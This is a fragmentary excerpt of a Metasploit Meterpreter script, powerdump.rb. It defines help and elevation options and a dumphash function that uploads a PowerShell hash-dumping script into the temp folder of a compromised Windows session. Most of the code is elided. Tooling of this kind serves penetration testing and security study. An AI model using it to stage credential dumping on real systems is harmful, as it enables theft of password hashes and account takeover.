# $Id: powerdump.rb 9212 2010-05-03 17:13:09Z rel1k $
#
...
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-e" => [ false, "Try to elevate permissions to system. (not working)" ]
)
...
def dumphash(session)
	...
	session.fs.file.upload_file("%TEMP%\\#{filename}","data/exploits/powershell/powerdump.ps1")
